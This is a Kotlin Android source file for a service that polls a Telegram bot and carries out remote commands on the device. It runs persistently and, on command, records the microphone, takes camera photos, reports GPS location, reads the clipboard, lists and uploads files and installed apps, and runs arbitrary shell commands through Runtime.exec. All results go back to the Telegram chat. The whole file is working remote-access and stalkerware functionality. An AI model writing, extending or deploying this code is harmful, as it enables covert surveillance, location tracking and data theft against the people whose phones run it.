package com.example.telegramlistener.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.telegramlistener.R
import com.example.telegramlistener.data.repo.EventRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import kotlin.math.log10
import com.example.telegramlistener.data.remote.InlineKeyboardMarkup
import com.example.telegramlistener.data.remote.InlineKeyboardButton
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Bundle
import android.os.Environment
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.speech.tts.TextToSpeech
import android.os.StatFs
import android.content.ClipboardManager
import android.content.pm.PackageManager
import android.app.ActivityManager
import android.widget.Toast
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.util.Locale

@AndroidEntryPoint
class MonitorService : Service(), CommandProcessor.CommandCallback, TextToSpeech.OnInitListener {

    @Inject
    lateinit var repository: EventRepository

    @Inject
    lateinit var commandProcessor: CommandProcessor

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var mediaRecorder: MediaRecorder? = null
    private var isRunning = false
    private var tts: TextToSpeech? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        tts = TextToSpeech(this, this)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(1, createNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(1, createNotification())
        }
        scheduleWorker() // Ensure worker is scheduled
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale.US
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startListening()
        }
        return START_STICKY
    }


    private fun startListening() {
        // Start Command Listener
        serviceScope.launch {
            var offset = 0L
            while (isRunning) {
                try {
                    val updates = repository.getUnprocessedUpdates(offset)
                    if (updates.isNotEmpty()) Log.d("MonitorService", "Received ${updates.size} updates")
                    for (update in updates) {
                        // Pass 'this' as callback (MonitorService implements CommandCallback)
                        commandProcessor.processUpdate(update, this@MonitorService)
                        offset = update.update_id + 1
                    }
                } catch (e: Exception) {
                    Log.e("MonitorService", "Error polling updates", e)
                }
                delay(2000)
            }
        }

        serviceScope.launch {
            // Clear old buffer
            repository.clearAllEvents()
            
            // Notify user and provide dashboard launcher
            repository.sendMessage(
                "🚀 *Commander Online*\nSession started at ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}",
                replyMarkup = InlineKeyboardMarkup(listOf(listOf(InlineKeyboardButton("🖥 Open Dashboard", callback_data = "menu"))))
            )
        }
    }
    
    private fun setupRecorder(outputFile: File? = null) {
        try {
            val file = outputFile ?: File(filesDir, "devnull")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
        } catch (e: SecurityException) {
            serviceScope.launch { repository.logEvent("ERROR", "Audio permission missing") }
        } catch (e: Exception) {
            serviceScope.launch { repository.logEvent("ERROR", "Recorder init failed: ${e.message}") }
        }
    }

    private fun scheduleWorker() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val uploadWork = PeriodicWorkRequestBuilder<UploadWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(applicationContext).enqueue(uploadWork)
    }

    private fun createNotification(): Notification {
        val channelId = "MonitorChannel"
        val channel = NotificationChannel(channelId, "Monitor Service", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Telegram Listener")
            .setContentText("Monitoring environment...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }

    override fun onDestroy() {
        isRunning = false
        mediaRecorder?.stop()
        mediaRecorder?.release()
        tts?.stop()
        tts?.shutdown()
        serviceJob.cancel()
        super.onDestroy()
    }

    // CommandCallback Implementation
    override fun onRecordAudio(duration: Int) {
        // Stop existing recorder if any
        mediaRecorder?.stop()
        mediaRecorder?.release()
        mediaRecorder = null
        
        val file = File(filesDir, "recording_${System.currentTimeMillis()}.3gp")
        serviceScope.launch {
            repository.sendMessage("Recording started: ${file.name}")
            setupRecorder(file)
            
            delay(duration * 1000L)
            
            // Stop recording
            mediaRecorder?.let {
                it.stop()
                it.release()
            }
            mediaRecorder = null
            repository.sendMessage("Recording saved: ${file.name}")
        }
    }

    override fun stopRecording() {
        mediaRecorder?.stop()
        mediaRecorder?.release()
        mediaRecorder = null
        serviceScope.launch { repository.logEvent("COMMAND", "Recording stopped") }
    }

    override fun wipeLogs() {
       serviceScope.launch { 
           repository.clearAllEvents()
           repository.sendMessage("🗑 Local logs and buffer have been wiped.")
       }
    }

    override fun getStatus(): String {
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batteryLevel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } else {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else -1
        }

        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val currentVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val volumePercent = (currentVolume * 100 / maxVolume.toFloat()).toInt()

        return """
            🔋 Battery: $batteryLevel%
            🔊 Volume: $volumePercent%
            🤖 Service: Running
            🎤 Monitoring: ${if (mediaRecorder != null) "Active" else "Idle"}
        """.trimIndent()
    }

    override fun setVolume(percent: Int) {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val targetVolume = (percent.coerceIn(0, 100) * maxVolume / 100.0).toInt()
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0)
    }

    override fun getLocation(): String {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return try {
            val provider = LocationManager.GPS_PROVIDER
            val location = locationManager.getLastKnownLocation(provider) 
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            if (location != null) {
                "📍 Location:\nLat: ${location.latitude}\nLon: ${location.longitude}\n\nGoogle Maps:\nhttps://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}"
            } else {
                "Location unknown (Try opening Maps on device to fix GPS)"
            }
        } catch (e: SecurityException) {
            "Permission denied for Location"
        } catch (e: Exception) {
            "Error getting location: ${e.message}"
        }
    }

    override fun getNetworkInfo(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetwork = cm.activeNetwork ?: return "No Active Network"
        val caps = cm.getNetworkCapabilities(activeNetwork) ?: return "No Network Capabilities"
        
        val type = when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
            else -> "Other"
        }
        
        var details = "Type: $type"
        if (type == "Wi-Fi") {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = wm.connectionInfo
            details += "\nSSID: ${info.ssid}\nStrength: ${WifiManager.calculateSignalLevel(info.rssi, 5)}/5"
        }
        return "📶 Network Status:\n$details"
    }

    override fun getMemoryInfo(): String {
        val actManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val memInfo = ActivityManager.MemoryInfo()
        actManager.getMemoryInfo(memInfo)
        val availMem = memInfo.availMem / (1024 * 1024)
        val totalMem = memInfo.totalMem / (1024 * 1024)
        
        val path = Environment.getDataDirectory()
        val stat = StatFs(path.path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong
        val totalStorage = (totalBlocks * blockSize) / (1024 * 1024)
        val availStorage = (availableBlocks * blockSize) / (1024 * 1024)

        return "💾 Memory Info:\nRAM: $availMem MB / $totalMem MB\nInternal Storage: $availStorage MB / $totalStorage MB"
    }

    override fun setFlashlight(on: Boolean) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = cameraManager.cameraIdList[0]
            cameraManager.setTorchMode(cameraId, on)
        } catch (e: Exception) {
            Log.e("MonitorService", "Flashlight error", e)
        }
    }

    override fun vibrate(duration: Long) {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val manager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            manager.defaultVibrator
        } else {
            getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(duration)
        }
    }

    override fun speakText(text: String) {
        tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
    }

    override fun showAlert(text: String) {
        // Showing a Toast since showing Dialog requires Activity handling or Overlay permission
        Handler(Looper.getMainLooper()).post {
             Toast.makeText(applicationContext, "🚨 ALERT: $text", Toast.LENGTH_LONG).show()
        }
        // Also try to launch an activity? Maybe too intrusive or complex for now.
    }

    override fun listApps(): String {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        return packages.filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
            .joinToString("\n") { pm.getApplicationLabel(it).toString() }
            .take(4000) // Telegram message limit
    }

    override fun launchApp(appName: String): String {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val app = packages.find { pm.getApplicationLabel(it).toString().equals(appName, ignoreCase = true) }
        
        return if (app != null) {
            val intent = pm.getLaunchIntentForPackage(app.packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                "Launched ${appName}"
            } else {
                "Cannot launch ${appName}"
            }
        } else {
            "App '$appName' not found"
        }
    }

    override fun listFiles(path: String): String {
        return try {
            val dir = if(path == "/") Environment.getExternalStorageDirectory() else File(path)
            if (!dir.exists() || !dir.isDirectory) return "Invalid directory"
            
            dir.listFiles()?.joinToString("\n") { 
                "${if(it.isDirectory) "📁" else "📄"} ${it.name}" 
            }?.take(4000) ?: "Empty directory"
        } catch (e: Exception) {
            "Error listing files: ${e.message}"
        }
    }

    override fun takePhoto(camId: String) {
        val file = File(cacheDir, "snap_${System.currentTimeMillis()}.jpg")
        val helper = CameraHelper(this)
        // Run on main thread to ensure proper context usage if needed, but CameraHelper handles background thread.
        // Camera access needs to be done carefully.
        try {
            helper.takePhoto(camId, file) { success ->
                if (success) {
                    serviceScope.launch {
                        val sent = repository.sendPhoto(file, "Here is your requested photo 📸")
                        if (sent) file.delete()
                    }
                } else {
                    serviceScope.launch { repository.sendMessage("⚠️ Camera capture failed or denied.") }
                }
            }
        } catch (e: Exception) {
            serviceScope.launch { repository.sendMessage("Camera Exception: ${e.message}") }
        }
    }

    override fun sendFile(path: String) {
        serviceScope.launch {
            val file = File(path)
            if (file.exists() && file.isFile) {
                repository.sendMessage("📤 Uploading: ${file.name}...")
                val success = repository.sendFile(file)
                if (!success) {
                    repository.sendMessage("❌ Failed to upload ${file.name}")
                }
            } else {
                repository.sendMessage("❌ File not found: $path")
            }
        }
    }

    override fun shell(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec(cmd)
            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }
            reader.close()
            process.waitFor()
            if (output.isEmpty()) "Command executed (no output)" else output.toString().take(4000)
        } catch (e: Exception) {
            "Shell Error: ${e.message}"
        }
    }

    override fun getClipboard(): String {
        return try {
            var clipText = "Empty"
            val latch = java.util.concurrent.CountDownLatch(1)
            Handler(Looper.getMainLooper()).post {
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                if (clipboard.hasPrimaryClip()) {
                    clipText = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: "No text"
                }
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            clipText
        } catch (e: Exception) {
            "Clipboard Error: ${e.message}"
        }
    }
}
